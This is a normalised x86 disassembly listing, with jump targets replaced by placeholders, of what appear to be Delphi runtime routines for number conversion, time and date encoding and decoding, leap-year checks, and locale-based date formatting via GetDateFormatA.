inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4097f7
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_4098d4
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_40998b
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_409996
neg edx
mov ecx esi
call sub_409996
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_40998b
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_4099b2
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402da8
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_409996
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_4099b2
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_4099e8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_4093d4
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404094
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409a18
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_4093d4
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404094
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409a48
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_404464
mov edx esp
xor ecx ecx
call sub_4098d4
test al al
jne r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] 0xb
lea edx [ esp + 0xc ]
mov eax [ rw-data ]
xor ecx ecx
call sub_408010
sub_409aa0
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404464
mov edx esp
xor ecx ecx
call sub_4098d4
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409acc
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404464
mov edx esp
xor ecx ecx
call sub_4098d4
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409b14
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409b58
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409bc8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_409b58
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_407ff8
sub_409c08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409b14
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407fdc
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407fdc
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407fdc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409c64
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409ca0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409c64
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409d68
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_409ca0
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407ff8
sub_409d98
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409b14
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407fdc
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407fdc
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407fdc
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409c64
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409ee4
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409d98
pop esi
pop ecx
pop ebp
retn 0x8
sub_409f04
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409b14
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409f40
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4029c0
sub_409f84
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_404264
mov edx eax
mov eax ebx
call sub_409f40
pop ecx
pop ebx
pop ebp
retn
sub_409fa4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408ec4
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409f40
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409ff0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_40a01c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409ee4
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_40a054
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409c08
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_40a094
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a1e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403fa4
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40403c
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a1e9
lea eax [ ebp - 0x118 ]
call sub_403fa4
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404214
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_404264
mov edx eax
mov eax [ ebx ]
call sub_40c660
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c7d4
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_4044c4
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c770
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_40419c
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c7d4
mov ecx eax
mov eax ebx
mov edx esi
call sub_404094
sub_40a1fc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a2da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403fa4
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40403c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40403c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a2e1
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404214
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404464
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_404264
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4044c4
sub_40a304
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40aa85
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aa8c
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403fc8
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c854
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c834
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409f40
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c854
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409f40
pop ecx
mov al [ eax + lookup_table_40a3e7 ]
jmp [ eax * 4 + jump_table_40a420 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409ff0
pop ecx
push ebp
call sub_40a01c
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409ff0
pop ecx
push ebp
call sub_40a01c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_40a094
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409f84
pop ecx
jmp r-xdata
push ebp
call sub_409ff0
pop ecx
push ebp
call sub_40a01c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_40a1fc
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409f84
pop ecx
jmp r-xdata
push ebp
call sub_409ff0
pop ecx
push ebp
call sub_40a01c
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409ff0
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409ff0
pop ecx
push ebp
call sub_40a054
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409ff0
pop ecx
push ebp
call sub_40a054
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409ff0
pop ecx
push ebp
call sub_40a054
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409ff0
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409ff0
pop ecx
push ebp
call sub_40a054
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_40a054
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408d20
test eax eax
jne r-xdata
push ebp
call sub_409ff0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a304
pop ecx
push ebp
call sub_40a054
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409fa4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409fa4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409fa4
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_40a01c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409fa4
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409fa4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409fa4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a304
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a304
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409fa4
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408d20
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409f40
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a304
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409f40
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409f40
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409f84
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409f04
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409f84
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408d20
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409f40
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409f40
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409f84
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409f04
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409f84
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c854
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408d20
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409f40
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
